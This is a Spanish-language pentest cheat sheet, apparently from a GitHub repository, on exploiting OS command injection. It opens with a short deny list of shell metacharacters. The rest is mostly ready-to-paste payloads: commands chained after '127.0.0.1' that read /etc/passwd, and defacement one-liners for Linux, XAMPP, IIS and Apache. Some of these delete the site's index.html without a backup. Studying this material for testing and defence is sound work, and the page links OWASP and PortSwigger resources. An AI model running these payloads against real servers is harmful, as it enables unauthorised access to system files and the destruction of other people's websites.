# Fz3r0 OWASP 💀🐝 - Command Injection 💉

## 💀 ¿Cómo explotar vulnerabilidad CMDI?

Una vez que se encontró la vulnerabilidad `in-band` o `blind` se procede a explotar de las siguientes maneras: 

### 💣 `In-Band CMDI: exploitation`

1. 💥 Utilizar `shell metacharacters` como [payload](https://github.com/Fz3r0/Fz3r0_-_Command_Injection/blob/main/12_Fz3r0_CMDI_-_Payloads/Command_Injection_Payloads.md) inicial:

````py
## General deny list to be included for command injection:
| ; & $ > < ' \ ! >> #

## Escape or filter special characters for --->>> Windows
( ) < > & * ‘ | = ? ; [ ] ^ ~ ! . " % @ / \ : + , `

## Escape or filter special characters for --->>> Linux
{ } ( ) > < & * ‘ | = ? ; [ ] $ – # ~ ! . " %  / \ : + , `

````

2. 💥 **Concatenar** comandos:

````py
## Concatena 127.0.0.1 + cat /etc/passwd + (concatena lo que sigue en el comando original con un &)

### Opción 1:
127.0.0.1 && cat /etc/passwd &

### Opción 2:
127.0.0.1 & cat /etc/passwd &

### Opción 3:
127.0.0.1 || cat /etc/passwd &

### Opción 4:
127.0.0.1 | cat /etc/passwd &

### Opción 4:
127.0.0.1 | cat /etc/passwd &

.
.
.

etc

````

Algo un poco mas complejo como un `defacement` se podría ver algo así:

1. Buscar por algún archivo con la extensión `*.html` / buscar directamente por el `*.index.html` / mapear directorio default para hosting de página. 

````sh
# Ejemplo 1
127.0.0.1 ; find / -type f -name "*.html" &

# Ejemplo 2
127.0.0.1 ; ls /var/www/ &

````

2. Crear un nuevo `index.html` con el defacement utilizando un `one-liner`, el original se guarda en un backup `.bak`:

````sh
127.0.0.1 ; cp /var/www/html/index.html /var/www/html/index.bak && echo "Hola mundo, soy Fz3r0" > /var/www/html/index.html &

````

O algo todavía más complejo, esto ya es un código HTML para un buen defacement _(aquí borramos la página original sin guardar backup, solo por chingar)_:

- **`Linux`:**

````sh
127.0.0.1 ; rm /var/www/html/index.html && echo '<!DOCTYPE html><html><head><title>Este es un título de prueba</title><style>body{background-color:black;color:white;}h1{color:yellow;}h2{color:cyan;}</style></head><body><h1>Este es el titulo Fz3r0</h1><h2>Este es el titulo 2 Fz3r0</h2><p style="color:red;">Este es el contenido en rojo y yo soy Fz3r0</p><img src="https://ejemplo.com/imagen.jpg" alt="Imagen de ejemplo"></body></html>' > /var/www/html/index.html &

````

- **`Windows`:**

````cmd
## XAMPP copiando original:
127.0.0.1 & ren C:\xampp\htdocs\index.html index.bak & copy NUL C:\xampp\htdocs\index.html & echo ^<!DOCTYPE html^><html><head><title>Este es un título de prueba</title><style>body{background-color:black;color:white;}h1{color:yellow;}h2{color:cyan;}</style></head><body><h1>Este es el título Fz3r0</h1><h2>Este es el título 2 Fz3r0</h2><p style="color:red;">Este es el contenido en rojo y yo soy Fz3r0</p><img src="https://ejemplo.com/imagen.jpg" alt="Imagen de ejemplo"></body></html> > C:\xampp\htdocs\index.html &

## XAMPP borrando original:
127.0.0.1 & copy NUL C:\xampp\htdocs\index.html & echo ^<!DOCTYPE html^><html><head><title>Este es un título de prueba</title><style>body{background-color:black;color:white;}h1{color:yellow;}h2{color:cyan;}</style></head><body><h1>Este es el título Fz3r0</h1><h2>Este es el título 2 Fz3r0</h2><p style="color:red;">Este es el contenido en rojo y yo soy Fz3r0</p><img src="https://ejemplo.com/imagen.jpg" alt="Imagen de ejemplo"></body></html> > C:\xampp\htdocs\index.html &

## IIS borrando original:
127.0.0.1 & copy NUL C:\inetpub\wwwroot\index.html & echo ^<!DOCTYPE html^><html><head><title>Este es un título de prueba</title><style>body{background-color:black;color:white;}h1{color:yellow;}h2{color:cyan;}</style></head><body><h1>Este es el título Fz3r0</h1><h2>Este es el título 2 Fz3r0</h2><p style="color:red;">Este es el contenido en rojo y yo soy Fz3r0</p><img src="https://ejemplo.com/imagen.jpg" alt="Imagen de ejemplo"></body></html> > C:\inetpub\wwwroot\index.html &

## Apache copiando original:
127.0.0.1 & ren C:\mi_apache\www\index.html index.bak & copy NUL C:\mi_apache\www\index.html & echo ^<!DOCTYPE html^><html><head><title>Este es un título de prueba</title><style>body{background-color:black;color:white;}h1{color:yellow;}h2{color:cyan;}</style></head><body><h1>Este es el título Fz3r0</h1><h2>Este es el título 2 Fz3r0</h2><p style="color:red;">Este es el contenido en rojo y yo soy Fz3r0</p><img src="https://ejemplo.com/imagen.jpg" alt="Imagen de ejemplo"></body></html> > C:\mi_apache\www\index.html &

````

## 📖 Recursos

- [Port Swigger - Command Injection](https://portswigger.net/web-security/os-command-injection)
- [OWASP - Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP - Command Injection Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [OWASP - Testing for Command Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection)
- [Udemy - Rana Khalil | Command Injection ](https://www.udemy.com/course/mastering-command-injection-the-ultimate-hands-on-course/learn/lecture/39297722#overview)
